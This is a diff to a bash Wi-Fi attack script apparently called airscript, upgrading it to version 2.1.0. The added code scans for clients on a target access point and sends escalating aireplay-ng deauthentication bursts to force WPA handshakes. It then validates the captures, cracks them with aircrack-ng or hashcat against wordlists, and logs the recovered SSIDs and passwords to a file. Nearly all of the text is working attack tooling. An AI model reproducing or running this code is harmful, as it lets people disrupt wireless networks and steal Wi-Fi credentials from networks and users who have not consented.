@@ -1,17 +1,32 @@
 #!/bin/bash
 
-
 # Ensure we are being ran as root
-if [ $(id -u) -ne 0 ]; then
+if [ "$(id -u)" -ne 0 ]; then
 	echo "This script must be ran as root"
 	exit 1
 fi
 
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
+SCRIPT_DIR="$(cd "$(dirname "$SCRIPT_PATH")" && pwd)"
 HANDSHAKE_DIR="$SCRIPT_DIR/handshakes"
 TOOLS_DIR="$SCRIPT_DIR/tools"
+LOG_DIR="$SCRIPT_DIR/logs"
+PASSWORD_LOG="$LOG_DIR/password"
+WORDLIST_DIR="$SCRIPT_DIR/wordlist"
+SYSTEM_WORDLIST_DIR="/opt/airscript/wordlist"
+SYSTEM_WORDLIST_DIR_ALT="/opt/airscript/wordlists"
+# Default priority: system wordlist first, then alt, then local copy
+if [ -f "$SYSTEM_WORDLIST_DIR/wordlist.txt" ]; then
+    DEFAULT_WORDLIST="$SYSTEM_WORDLIST_DIR/wordlist.txt"
+elif [ -f "$SYSTEM_WORDLIST_DIR_ALT/wordlist.txt" ]; then
+    DEFAULT_WORDLIST="$SYSTEM_WORDLIST_DIR_ALT/wordlist.txt"
+else
+    DEFAULT_WORDLIST="$WORDLIST_DIR/wordlist.txt"
+fi
 base_interface=""
 monitor_interface=""
+MAX_HANDSHAKE_ATTEMPTS=5
+CLIENTS=()
 
 enter_tool_dir() {
     local path="$1"
@@ -78,7 +93,7 @@ banner () {        ##### Banner #####
     echo -e "${Red}            /~~\\ | |  \\ .__/ \\__, |  \\ | |     |     "
 
     #echo -e "${Yellow} \n                     Hack the world!!!     "
-    echo -e "${Green}\n   [Version: 2.0.9 Stable] Developed by: Liam Bendix"
+    echo -e "${Green}\n   [Version: 2.1.0 Stable] Developed by: Liam Bendix"
   
 }
 menu () {        ##### Display available options in two columns #####
@@ -229,7 +244,7 @@ while true; do
     read -p "Do you want to recive email notifications when it's done pwning?" yn
     case $yn in
         [Yy]* ) attackYes; break;;
-        [Nn]* ) attackNo;;
+        [Nn]* ) attackNo; break;;
         * ) echo "Please answer yes or no.";;
     esac
 done
@@ -243,11 +258,7 @@ echo "Remember to check your spam folder!"
 sleep 3
 network
 monitor
-airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
-echo -e "[${Green}${foo}${White}] Sending DeAuth to target..."
-xterm -e aireplay-ng --deauth 20 -a $bssid $foo
-echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
-check_cap_files
+deauthAttack
 sleep 3
 pkill -9 xterm
 if [ -n "$email" ]; then
@@ -260,25 +271,17 @@ fi
 attackNo () {
     network
     monitor
-airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
-echo -e "[${Green}${foo}${White}] Sending DeAuth to target..."
-xterm -e aireplay-ng --deauth 20 -a $bssid $foo
-echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
-check_cap_files
+deauthAttack
 pkill -9 xterm
 #crack
 }
 
 wordlist () {        ##### Enter path to wordlist or use default #####
-read -p $'[\e[0;92mInput\e[0;97m] Path to wordlist (Press enter to use default): ' fileLocation
-if [ -z "$fileLocation" ]; then
-fileLocation="${parameter:-dictionary/defaultWordList.txt}"
-return 0
-elif [[ -f "$fileLocation" ]]; then
-return 0
-fi
-echo -e "[${Red}!$White] File doesn't exist..."
-wordlist
+    ensure_wordlist_dir
+    while true; do
+        fileLocation=$(select_wordlist) && return 0
+        echo -e "[${Red}!$White] File doesn't exist... please try again."
+    done
 
 }
 
@@ -295,7 +298,7 @@ while true; do
     read -p "Do you want to recive email notifications when it's done pwning?" yn
     case $yn in
         [Yy]* ) attackAllYes; break;;
-        [Nn]* ) attackAllNo;;
+        [Nn]* ) attackAllNo; break;;
         * ) echo "Please answer yes or no.";;
     esac
 done
@@ -342,6 +345,189 @@ attackAllNo () {
     crack
 }
 
+ensure_log_dirs() {
+    mkdir -p "$LOG_DIR"
+    touch "$PASSWORD_LOG"
+}
+
+ensure_wordlist_dir() {
+    mkdir -p "$WORDLIST_DIR"
+    # If local wordlist.txt is missing but a system default exists, expose it via symlink for clarity
+    if [ ! -f "$WORDLIST_DIR/wordlist.txt" ] && [ -f "$DEFAULT_WORDLIST" ] && [ "$DEFAULT_WORDLIST" != "$WORDLIST_DIR/wordlist.txt" ]; then
+        ln -sf "$DEFAULT_WORDLIST" "$WORDLIST_DIR/wordlist.txt"
+    fi
+}
+
+select_wordlist() {
+    ensure_wordlist_dir
+    # Helper to list wordlists with a "(none)" placeholder
+    list_dir() {
+        local dir="$1"
+        echo "Available wordlists in $dir:" >&2
+        if [ -d "$dir" ]; then
+            local output
+            output=$(cd "$dir" 2>/dev/null && ls -1)
+            if [ -n "$output" ]; then
+                printf '%s\n' "$output" >&2
+            else
+                echo "(none)" >&2
+            fi
+        else
+            echo "(dir not found)" >&2
+        fi
+    }
+
+    # Show available wordlists (system first)
+    list_dir "$SYSTEM_WORDLIST_DIR"
+    list_dir "$SYSTEM_WORDLIST_DIR_ALT"
+    list_dir "$WORDLIST_DIR"
+
+    read -p "Type a wordlist filename from above or any path (default: $DEFAULT_WORDLIST): " user_wordlist
+    user_wordlist="$(printf '%s' "$user_wordlist" | sed 's/^ *//;s/ *$//')"
+
+    # Use defaults when the user hits enter
+    if [ -z "$user_wordlist" ]; then
+        user_wordlist="$DEFAULT_WORDLIST"
+    fi
+
+    # Resolve relative paths against known wordlist directories
+    if [ -n "$user_wordlist" ] && [ ! -f "$user_wordlist" ]; then
+        if [ -f "$WORDLIST_DIR/$user_wordlist" ]; then
+            user_wordlist="$WORDLIST_DIR/$user_wordlist"
+        elif [ -f "$SYSTEM_WORDLIST_DIR/$user_wordlist" ]; then
+            user_wordlist="$SYSTEM_WORDLIST_DIR/$user_wordlist"
+        elif [ -f "$SYSTEM_WORDLIST_DIR_ALT/$user_wordlist" ]; then
+            user_wordlist="$SYSTEM_WORDLIST_DIR_ALT/$user_wordlist"
+        fi
+    fi
+
+    if [ -z "$user_wordlist" ] || [ ! -f "$user_wordlist" ]; then
+        echo "Wordlist not found: $user_wordlist"
+        return 1
+    fi
+
+    printf '%s\n' "$user_wordlist"
+}
+
+extract_ssid_from_cap() {
+    local cap_file="$1"
+    local ssid=""
+
+    # Try tshark first
+    if command -v tshark >/dev/null 2>&1; then
+        ssid=$(tshark -r "$cap_file" -Y "wlan_mgt.ssid" -T fields -e wlan_mgt.ssid 2>/dev/null | head -n 1)
+    fi
+
+    # Fallback: parse aircrack-ng table output to recover ESSID
+    if [ -z "$ssid" ] && command -v aircrack-ng >/dev/null 2>&1; then
+        local tmp_wordlist
+        tmp_wordlist=$(mktemp) || true
+        echo "dummy" > "$tmp_wordlist"
+        ssid=$(
+            aircrack-ng -a2 -w "$tmp_wordlist" "$cap_file" 2>/dev/null | \
+            awk '
+                /^[[:space:]]*[0-9]+[[:space:]]+[0-9A-Fa-f:]{17}/ {
+                    essid=""
+                    # ESSID is between BSSID and the encryption columns; gather middle fields.
+                    for (i = 3; i <= NF-2; i++) {
+                        essid = essid $i (i < NF-2 ? " " : "")
+                    }
+                    gsub(/^[ \t]+|[ \t]+$/, "", essid)
+                    if (length(essid) > 0) {
+                        print essid
+                        exit
+                    }
+                }
+            '
+        )
+        rm -f "$tmp_wordlist"
+    fi
+
+    if [ -z "$ssid" ] && [ -n "$targetName" ]; then
+        ssid="$targetName"
+    fi
+
+    if [ -z "$ssid" ]; then
+        ssid=$(basename "$cap_file")
+    fi
+
+    echo "$ssid"
+}
+
+log_cracked_password() {
+    local ssid="$1"
+    local password="$2"
+    local timestamp
+
+    ensure_log_dirs
+    timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+    echo "$timestamp | SSID: $ssid | Password: $password" >> "$PASSWORD_LOG"
+    echo -e "\e[32m[Saved]\e[0m Stored credentials for $ssid in $PASSWORD_LOG"
+}
+
+crack_caps_locally() {
+    echo "You have selected local cracking."
+    ensure_wordlist_dir
+    echo "Your wordlist directory: $WORDLIST_DIR"
+    local wordlist
+    while true; do
+        wordlist=$(select_wordlist) && break
+        echo "Please enter a valid wordlist path."
+    done
+
+    for cap_file in *.cap; do
+        [ -f "$cap_file" ] || continue
+        echo "Cracking $cap_file ..."
+        local temp_output password_found ssid found_file
+        temp_output=$(mktemp)
+        found_file=$(mktemp)
+
+        # Use aircrack-ng's -l flag to write the recovered key to a file to avoid parsing errors
+        sudo aircrack-ng -w "$wordlist" -l "$found_file" "$cap_file" | tee "$temp_output"
+
+        if [ -s "$found_file" ]; then
+            password_found=$(head -n 1 "$found_file")
+        else
+            # Fallback to parsing stdout if -l did not produce a file
+            password_found=$(awk -F'[][]' '/KEY FOUND!/{gsub(/^[ \t]+|[ \t]+$/, "", $2); print $2}' "$temp_output" | tail -n 1)
+        fi
+
+        if [ -n "$password_found" ]; then
+            ssid=$(extract_ssid_from_cap "$cap_file")
+            log_cracked_password "$ssid" "$password_found"
+        else
+            echo "No password recovered for $cap_file"
+        fi
+        rm -f "$temp_output" "$found_file"
+    done
+
+    cleanup_handshakes
+    exit
+}
+
+validate_target() {
+    # Trim whitespace from BSSID and channel
+    bssid=$(echo "$bssid" | tr -d '[:space:]')
+    channel=$(echo "$channel" | tr -d '[:space:]')
+
+    if ! [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+        echo -e "\e[31m[Error]\e[0m Invalid BSSID: '$bssid'"
+        return 1
+    fi
+
+    if ! [[ "$channel" =~ ^[0-9]+$ ]]; then
+        echo -e "\e[31m[Error]\e[0m Invalid channel: '$channel'"
+        return 1
+    fi
+
+    if [ -z "$foo" ]; then
+        echo -e "\e[31m[Error]\e[0m Monitor interface not set."
+        return 1
+    fi
+
+    return 0
+}
+
 
 crack () {
 checkServices
@@ -366,15 +552,7 @@ crack_hashes() {
     select method in "Local (Device)" "Upload (WPA-Sec)"; do
         case $method in
             "Local (Device)")
-                # Local cracking with Hashcat or other methods (you can extend this part)
-                echo "You have selected local cracking."
-                echo "Your current directory:"
-                pwd
-                ls *.txt &>/dev/null
-                read -p "Enter path to wordlist : " wordlist
-                sudo aircrack-ng -w "$wordlist" *.cap
-                cleanup_handshakes
-                exit
+                crack_caps_locally
                 ;;
             "Upload (WPA-Sec)")
                 # Ask for the user's email for cracking (optional, based on the site)
@@ -957,69 +1135,242 @@ cd /sys/class/net && select foo in *; do echo $foo selected $foo; break; done
 
 
 
-# Function to check if EAPOL frames exist in a .cap file
-check_eapol_in_cap() {
-    local cap_file=$1
-    if tshark -r "$cap_file" -Y "eapol" | grep -q "EAPOL"; then
-        echo "EAPOL data found in $cap_file"
-        return 0
+# Capture connected clients for the selected BSSID
+capture_clients() {
+    local csv_file="client-01.csv"
+    client=""
+    CLIENTS=()
+    local duration=15
+    local cap_pid=0
+
+    rm -f "$csv_file"
+    echo "Scanning for clients on $bssid (channel $channel)... (full ${duration}s)"
+
+    # Ensure interface is on the right channel before scanning
+    sudo iwconfig "$foo" channel "$channel" >/dev/null 2>&1
+
+    # Start capture in background with a hard cap on runtime
+    sudo airodump-ng --bssid "$bssid" --channel "$channel" --output-format csv --write client "$foo" >/dev/null 2>&1 &
+    cap_pid=$!
+
+    # Enforce a full capture window to increase chance of seeing clients
+    for _ in $(seq 1 "$duration"); do
+        sleep 1
+    done
+
+    # Stop capture process if still running
+    if ps -p "$cap_pid" >/dev/null 2>&1; then
+        kill "$cap_pid" >/dev/null 2>&1
+        wait "$cap_pid" 2>/dev/null
+    fi
+
+    echo "Client scan finished."
+
+    if [ ! -f "$csv_file" ]; then
+        echo -e "\e[31m[Error]\e[0m client CSV not found; proceeding without specific client."
+        client=""
+        return
+    fi
+
+    # Collect all associated client MACs (unique)
+    while IFS= read -r mac; do
+        # de-duplicate
+        local seen=false
+        for existing in "${CLIENTS[@]}"; do
+            if [ "$existing" = "$mac" ]; then
+                seen=true
+                break
+            fi
+        done
+        if [ "$seen" = false ]; then
+            CLIENTS+=("$mac")
+        fi
+    done < <(
+        awk -F',' -v bssid="$bssid" '
+            {
+                gsub(/^[ \t]+|[ \t]+$/, "", $1)
+                gsub(/^[ \t]+|[ \t]+$/, "", $6)
+                if ($1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ && $6 == bssid && $1 != bssid) {
+                    print $1
+                }
+            }
+        ' "$csv_file"
+    )
+
+    if [ "${#CLIENTS[@]}" -gt 0 ]; then
+        echo -e "\e[32m[Clients]\e[0m Found ${#CLIENTS[@]} client(s)."
     else
-        echo "No EAPOL data found in $cap_file"
+        echo -e "\e[33m[Warning]\e[0m No associated clients found; falling back to broadcast deauth."
+    fi
+}
+
+
+# Function to check if a capture contains a valid WPA handshake for the target BSSID
+check_valid_handshake() {
+    local cap_file=$1
+
+    if [ ! -f "$cap_file" ]; then
         return 1
     fi
+
+    # Use a temp wordlist with a dummy line so aircrack-ng does not error on /dev/null or empty files
+    local tmp_wordlist
+    tmp_wordlist=$(mktemp) || return 1
+    echo "dummy" > "$tmp_wordlist"
+
+    # Prefer aircrack-ng verification because tshark can report false positives on truncated files
+    if command -v aircrack-ng >/dev/null 2>&1 && [ -n "$bssid" ]; then
+        local aircrack_output
+
+        # First try with the target BSSID
+        aircrack_output=$(aircrack-ng -a2 -b "$bssid" -w "$tmp_wordlist" "$cap_file" 2>/dev/null)
+
+        # Some builds throw "Pre-condition Failed" with -b; retry without -b if that happens
+        if echo "$aircrack_output" | grep -qi "Pre-condition Failed"; then
+            aircrack_output=""
+        fi
+
+        # If the BSSID run did not confirm a handshake, retry without -b to read the handshake count
+        if ! echo "$aircrack_output" | grep -Eqi "1 handshake|handshake[: ]+yes|valid WPA handshake|WPA handshake|WPA \\(1 handshake\\)"; then
+            aircrack_output=$(aircrack-ng -a2 -w "$tmp_wordlist" "$cap_file" 2>/dev/null)
+        fi
+
+        # Consider these as valid handshake signals
+        if echo "$aircrack_output" | grep -Eqi "1 handshake|handshake[: ]+yes|valid WPA handshake|WPA handshake|WPA \\(1 handshake\\)" && \
+           ! echo "$aircrack_output" | grep -Eqi "0 handshake|WPA handshake: *no"; then
+            echo "Handshake verified in $cap_file (aircrack-ng)"
+            rm -f "$tmp_wordlist"
+            return 0
+        fi
+        # If a key was somehow found, also treat as valid
+        if echo "$aircrack_output" | grep -qi "key found"; then
+            echo "Handshake verified in $cap_file (key already found)"
+            rm -f "$tmp_wordlist"
+            return 0
+        fi
+        echo "No valid WPA handshake found in $cap_file (aircrack-ng check failed)"
+        rm -f "$tmp_wordlist"
+        return 1
+    fi
+
+    rm -f "$tmp_wordlist"
+
+    # Fallback only if aircrack-ng is unavailable: require at least one EAPOL frame
+    if command -v tshark >/dev/null 2>&1 && tshark -r "$cap_file" -Y "eapol" -c 1 >/dev/null 2>&1; then
+        echo "EAPOL data found in $cap_file (tshark fallback)"
+        return 0
+    fi
+
+    echo "No valid handshake found in $cap_file (no verifier available)"
+    return 1
 }
 
 # Function to check if .cap files exist and verify EAPOL frames
 check_cap_files() {
-    # Clear the screen
-    #clear
-
-    # Check if any .cap files exist in the current directory
-    if ls *.cap &> /dev/null; then
-        # .cap files are present
-        echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"  # Green text
-        
-        # Loop through each .cap file to check for EAPOL frames
-        for cap_file in *.cap; do
-            echo -e "\nChecking $cap_file for EAPOL frames..."
-            if check_eapol_in_cap "$cap_file"; then
-                echo -e "\e[32m[EAPOL Found]\e[0m Proceeding with cracking."
-                
-                # Turn off monitor mode silently
-                echo "Turning off monitor mode..."
-                stopMon
-                if [ -n "$email" ]; then
-                    echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email" > /dev/null 2>&1
-                fi
-                # Now proceed with cracking
-                crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
-                
-                return 0  # Stop after finding a valid file with EAPOL
-            else
-                echo -e "\e[31m[EAPOL Not Found]\e[0m Skipping file."
-            fi
-        done
-        
-        # If no valid .cap files with EAPOL are found, exit
-        echo -e "\e[31mNo valid .cap files with EAPOL data found. 0 Handshakes captured. Trying again...\e[0m"
-        deauthAttack
-    else
-        # No .cap files found
-        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"  # Red text
-        sleep 3
-        deauthAttack
+    if ! ls *.cap >/dev/null 2>&1; then
+        echo -e "\e[31m[FAILED] No .cap files found.\e[0m"
+        return 1
     fi
 
+    echo -e "\e[32m[SUCCESS] .cap files found.\e[0m"
+
+    for cap_file in *.cap; do
+        echo -e "\nChecking $cap_file for EAPOL frames..."
+        if check_valid_handshake "$cap_file"; then
+            echo -e "\e[32m[Handshake Found]\e[0m Proceeding with cracking."
+
+            echo "Turning off monitor mode..."
+            stopMon
+            if [ -n "$email" ]; then
+                echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email" > /dev/null 2>&1
+            fi
+
+            crack "$cap_file"
+            return 0
+        else
+            echo -e "\e[31m[Handshake Not Found]\e[0m Skipping file."
+        fi
+    done
+
+    echo -e "\e[31mNo valid .cap files with handshakes found.\e[0m"
+    return 1
 }
 
 deauthAttack () {
-sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
-recon
+    if ! validate_target; then
+        return 1
+    fi
 
-    sleep 4
-xterm -e aireplay-ng -0 50 -a $bssid -c $client $foo
-sleep 2
-check_cap_files
+    local attempt=1
+    local airodump_pid=0
+    while [ "$attempt" -le "$MAX_HANDSHAKE_ATTEMPTS" ]; do
+        capture_clients
+
+        # Rotate through discovered clients across attempts
+        if [ "${#CLIENTS[@]}" -gt 0 ]; then
+            client="${CLIENTS[$(( (attempt - 1) % ${#CLIENTS[@]} ))]}"
+            echo -e "\e[32m[Client]\e[0m Targeting client $client (attempt $attempt)"
+        else
+            client=""
+            echo -e "\e[33m[Warning]\e[0m No clients to target; using broadcast deauth."
+        fi
+
+        echo -e "\e[33m[Attempt $attempt/$MAX_HANDSHAKE_ATTEMPTS]\e[0m Capturing handshake on $bssid (channel $channel)..."
+
+        # Use per-attempt capture prefix to avoid overwriting
+        capture_prefix="handshake_${attempt}"
+
+        # Start capture
+        sudo airodump-ng --bssid "$bssid" --channel "$channel" --output-format pcap --write "$capture_prefix" "$foo" >/dev/null 2>&1 &
+        airodump_pid=$!
+
+        # Give airodump-ng a moment to start
+        sleep 5
+
+        # Aggressive deauth bursts increase each attempt
+        local deauth_count
+        deauth_count=$((30 + (attempt - 1) * 30))
+
+        # Send deauth frames; if client is known, target it, otherwise broadcast
+        if [ -n "$client" ]; then
+            xterm -e aireplay-ng -0 "$deauth_count" -a "$bssid" -c "$client" "$foo"
+            # Follow with a broadcast burst to catch other clients
+            xterm -e aireplay-ng -0 "$deauth_count" -a "$bssid" "$foo"
+        else
+            xterm -e aireplay-ng -0 "$deauth_count" -a "$bssid" "$foo"
+        fi
+
+        # Allow capture time after deauth
+        sleep 12
+
+        # Stop capture cleanly
+        if ps -p $airodump_pid >/dev/null 2>&1; then
+            kill $airodump_pid
+            wait $airodump_pid 2>/dev/null
+        fi
+
+        # Give filesystem a moment to flush capture data
+        sleep 3
+
+        # Check for handshake
+        if check_cap_files; then
+            return 0
+        fi
+
+        echo -e "\e[33m[Retry]\e[0m Handshake not found. Retrying..."
+        attempt=$((attempt + 1))
+    done
+
+    # If we reach here, attempts exhausted. If we have captures, offer to crack anyway.
+    if ls *.cap >/dev/null 2>&1; then
+        echo -e "\e[33m[Notice]\e[0m Captures exist but no validated handshake. Proceeding to cracking anyway."
+        stopMon
+        crack
+        return 0
+    fi
+
+    echo -e "\e[31m[Failed]\e[0m Could not capture a valid handshake after $MAX_HANDSHAKE_ATTEMPTS attempts."
+    return 1
  } 
 
 
@@ -1172,13 +1523,31 @@ crackCAT () {
                 # Local cracking with Hashcat or other methods (you can extend this part)
                 stopMon
                 echo "You have selected local cracking."
-                echo "Your current directory:"
-                pwd
-                ls *.txt
-                read -p "Enter path to wordlist : " wordlist
+                ensure_wordlist_dir
+                local wordlist
+                while true; do
+                    wordlist=$(select_wordlist) && break
+                    echo "Please enter a valid wordlist path."
+                done
                 # Crack the password using aircrack-ng and a wordlist
                 echo "Attempting to crack the password..."
-                hashcat -m 22000 hash.hc22000 $wordlist 
+                local crack_output password_found ssid
+                crack_output=$(mktemp)
+                hashcat -m 22000 hash.hc22000 "$wordlist" --outfile "$crack_output" --outfile-format 2
+                if [ -s "$crack_output" ]; then
+                    password_found=$(tail -n 1 "$crack_output")
+                    if [ -f essidlist ]; then
+                        ssid=$(head -n 1 essidlist)
+                    fi
+                    if [ -z "$ssid" ] && [ -n "$targetName" ]; then
+                        ssid="$targetName"
+                    fi
+                    if [ -z "$ssid" ]; then
+                        ssid="hash.hc22000"
+                    fi
+                    log_cracked_password "$ssid" "$password_found"
+                fi
+                rm -f "$crack_output"
                 exit
                 ;;
             "Upload (WPA-Sec)")
